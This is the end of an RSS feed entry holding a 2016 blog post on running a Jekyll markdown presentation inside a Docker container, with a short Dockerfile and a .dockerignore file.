&lt;p&gt;This turns out to have quite a nice workflow for creating presentations as all your content is a series of markdown files and you can just commit changes to a git repository, which makes updating and modifying content for your presentation very easy, basically anywhere with a text editor does the job.&lt;/p&gt;

&lt;p&gt;Also once your presentation is complete you can access from any machine with a browser, which removes the ties of having to run on a specific operating system with specific presentation software installed.&lt;/p&gt;

&lt;p&gt;All that said, one slight downside which occurred to me is that whilst editing the presentation is as simple as running a text editor, when you’re presenting you need a working jekyll environment with a valid ruby install and the attendant gems. This sounded like a classic case where …. you guessed it…. Docker comes in handy !&lt;/p&gt;

&lt;p&gt;So I turned my presentation into a docker container :)&lt;/p&gt;

&lt;p&gt;The Dockerfile to do this was really pretty straightforward&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM jekyll/jekyll
MAINTAINER Rory McCune &amp;lt;rorym@mccune.org.uk&amp;gt;
RUN mkdir /presentation
WORKDIR /presentation/
ADD . /presentation/
RUN chown -R 1000:1000 /presentation/*
CMD [&quot;jekyll&quot;, &quot;serve&quot;, &quot;-H&quot;, &quot;0.0.0.0&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;from the base jekyll install it basically just adds the git working directory to the image and runs jekyll to serve up the presentation.  The only gotcha I encountered was that the jekyll image very sensibly doesn’t run as root, so you need to chown your presentation files appropriately to avoid permission issues when you run the container.&lt;/p&gt;

&lt;p&gt;This is also a useful time to use a &lt;code class=&quot;highlighter-rouge&quot;&gt;.dockerignore&lt;/code&gt; file to avoid the container getting all the git history which it doesn’t need&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.git
.gitignore
README.md
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After that it’s just a questions of running the container and exposing the relevant port, and your presentation will run from any machine that has docker installed and a browser to view the content.&lt;/p&gt;

&lt;p&gt;In my case it’s let me have a backup of my talk sitting on a &lt;a href=&quot;http://presentation.pwndland.uk&quot;&gt;web server&lt;/a&gt; in case of last minute laptop problems.  I may also have created a Kubernetes cluster to run it, but that’s a story for another blog post :)&lt;/p&gt;
</description>
				<pubDate>Mon, 06 Jun 2016 10:01:39 +0100</pubDate>
				<link>/blog/2016/06/06/Presentation-In-A-Docker-Container/</link>
				<guid isPermaLink="true">/blog/2016/06/06/Presentation-In-A-Docker-Container/</guid>
			</item>
		
	</channel>
</rss>
